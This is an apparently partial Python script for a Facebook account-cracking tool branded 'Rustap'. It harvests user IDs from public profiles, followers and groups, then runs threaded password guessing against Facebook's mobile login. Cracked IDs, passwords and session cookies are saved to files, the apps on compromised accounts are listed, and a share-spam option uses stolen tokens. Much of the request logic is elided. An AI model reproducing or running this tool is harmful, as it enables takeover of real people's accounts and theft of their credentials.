# DON'T MISSUSE IF U MISSUSE THIS THEN I AM NOT GOING TO BE RESPONSIBLE OF ANY KIND OF PROBLEMS.. THANKS â¤ðŸ”¥
# FOLLOWðŸ’— MY GIT HUB IF YOU WANT MORE OPEN SOURCE SCRIPT âœ…ðŸ¥²
...
try:
        ...
        cetak(nel('\tRustap Currently Installing Rich Module Rustap'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\tRustap Currently Installing Stdiomask Module Rustap'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\tRustap Currently Installing Modul Requests Rustap'))
...
try:
	...
	print('[[\x1b[1;92mRustap\x1b[1;97m] [\x1b[1;96mMr_Rustap')
...
\033[91;1m(!) Author   :  Rustap
\033[92;1m(!) Github   :  rustapXalex
\033[96;1m(!) Facebook :  Rustapp Chaudharyy 
\033[94;1m(!) Type     :  Paid
\033[95;1m(!) Free tero bau le dinxa?¤

\033[92;1m    THIS TOOL CREATED BY RUSTAP... '''
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\ Extension Suggestions : [green]Cookie Dee Khate[white] '))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}Rustap{x}] Insert Cookies :{asu} ')
		...
		print(f'  {x}[{h}Rustap{x}]{h} LOGIN SUCCEED.........!{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	gh = 'github.com/D3I-Z3N-FFX'
	cetak(nel('\WELCOME [yellow]%s[white] fuck'%(my_name)))
	print(f'â”œâ”€â”€>\033[93;1m Your Idz : '+str(my_id))
	print(f'â”œâ”€â”€>\033[95;1m Your Ip  : {ip}')
	print(f'â”œâ”€â”€>\033[92;1m Github   : {gh}')
	print('|')
	print('â”œâ”€â”€> 1.\033[94;1m Crack Public ')
	print('â”œâ”€â”€> 2.\033[95;1m Crack Follower ')
	print('â”œâ”€â”€> 3.\033[92;1m any bug  ')
	print('â”œâ”€â”€> 4.\033[91;1m Crack File	')
	print('â”œâ”€â”€> 5.\033[94;1m Results Crack  ')
	print('â”œâ”€â”€> 6.\033[95;1m Share posting FB ')
	print('â”œâ”€â”€> 0.\033[97;1m Exit      ')
	print('|')
	_____alvino__adijaya_____ = input('\râ”œâ”€â”€> Pilih : ')
	if _____alvino__adijaya_____ in ['1']:
		...
		back()
def error():
	jalan(f'{sir}â”œâ”€â”€> wait you will be redirected to Facebook {x}')
	time.sleep(4)
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('â”œâ”€â”€> How many targets do you want ? : '))
	except ValueError:
		print('â”œâ”€â”€> Enter the Uid Number Instead of the Letter ')
		exit()
	if jum<1 or jum>100:
		print('â”œâ”€â”€> Failed Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('â”œâ”€â”€> Enter Idz '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			print('â”œâ”€â”€> connection error ')
			exit()
	try:
		print('|')
		print(f'â”œâ”€â”€> Total Idz ”¥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('â”œâ”€â”€> Connection error')
...
def dump_pengikut():
	...
	try:
		...
		print('>> Troubled Internet Connection ')
		exit()
	except (KeyError,IOError):
...
def lah():
	print(f'\n{x}>> Total Idz which collected :{h} %s '%(len(id)))
	input(f'{x}>> [ {m}click Enter {x}] ')
	print('')
	pass
	setting()
def grup():
	...
	if berr2=='Masuk Facebook':
		print(" Exposed Limit, Please Use Airplane Mode And Try Again..")
		time.sleep(0.5)
		grup()
	elif berr2=='Error':
...
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'{x}â”œâ”€â”€> Collecting Idz ')
	print(f'â”œâ”€â”€> Click {k}Ctrl+C{x} For {m}Stop{x} Dump !!')
	while True:
		try:
			#ua = 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36'
			miskinlu = {"user-agent": ua}
			...
			for cari in tes:
				...
				if 'submit' in spl:
					...
					if idku in id:
						...
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Fetching Process ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
...
threads = []
def memek():
	print("1. Spam share via tokens and cookies Recommended")
	ask = input("\nselect : ")
	if ask in["1"]:
		token_cookie()
	...
	try:
		...
		for x in range(limit):
			...
			if 'id' in post:
				...
				exit("Failed to share, possibility token invalid")
	except:
		exit("Failed to share, possibility token invalid")
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}â”œâ”€â”€> 1. Only Old ')
	print('â”œâ”€â”€> 2. Only New ')
	print('â”œâ”€â”€> 3. Mix ')
	print('|')
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('|')
	_jembot_ = input('â”œâ”€â”€> Add application ( Y/t ) ')
	if _jembot_ in ['']:
		print('â”œâ”€â”€> Choose the Right Option ')
		back()
		...
		taplikasi.append('no')
	pwplus=input('â”œâ”€â”€> Add Manual Password ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]Rustap¢[white]] Enter an additional password of at least 6 characters\n[[cyan]Rustap[white]] Contoh :[green] brother, fuck, sister[white] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'â”œâ”€â”€>{m}Rustap{k}Rustap{h}Rustap{x} currently swipe sun{m}Rustap{k}Rustap{h}Rustap{x} ')
	print('|')
	print(f'â”œâ”€â”€> Result {h}OK{x} Saved In : {h}OK/%s {x}'%(okc))
	print(f'â”œâ”€â”€> Result {k}CP{x} Saved In : {k}CP/%s {x}'%(cpc))
	print(f'â”œâ”€â”€>  Play Airplane Mode Any {m}1k{x} Idz\r')
	print('|')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('|')
	cetak(nel('\t[cyan]âœ“[green]Crack Done, Donot Forget to Be Thankful [cyan] âœ“[white] '))
	print(f'[{b}Rustap{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}Rustap{x}]{k} CP : {k}%s{x} '%(cp))
	print('|')
	print('â”œâ”€â”€>Continue Crack Back ( Y/t ) ? ')
	woi = input('â”œâ”€â”€>Select : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}â”œâ”€â”€>{k} Good Bye {x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r%sðŸ•ž%sðŸ%s ðŸ OK:%s ðŸ CP:%s ðŸ %s%s%s   '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				open('CP/'+cpc,'a').write(idf+' Rustap '+pw+'\n')
				akun.append(idf+' Rustap '+pw)
				cp+=1
				break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[Rustap] ID       : {idf} [Rustap] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='RUSTAP-XD CP'))
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[Rustap] ID       : {idf}\n[Rustap] PASSWORD : {pw}\n[Rustap] COOKIES  : {cookies}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='RUSTAP-XD OK'))
					ok+=1
					break
					...
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][Rustap] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
					...
					hit=0
					infoakun += (f"\n[bold yellow][Rustap] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
					...
					print('\n')
					statusok = f'[bold green][Rustap] ID       : {idf}\n[Rustap] PASSWORD : {pw}\n[Rustap] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]RUSTAP-XD OK[/bold green]'))
					ok+=1
					break
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Unable to Check Options (Check Login on Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Unable to Check Options%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
...
def cek_apk(session,cookie):
	...
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] there are no active applications in this account.")
	else:
	...
	if len(game)==0:
		...
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Expires"," Expires"),N))
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/RUSTAP-DUMP')
	except:pass
	...
	alvino_xy(f'\n\t{x}Owner"> {h}Script By RUSTAP\n\t{x}Owner”> {h}Enjoy this tool\n\t{x}Owner”> {h}Improved version of v1\n\t{x}Owner”> {h}Dont miss use this tool\n\t{x}Owner”> {h}Have a good day{x}')
	time.sleep(3)
	login()
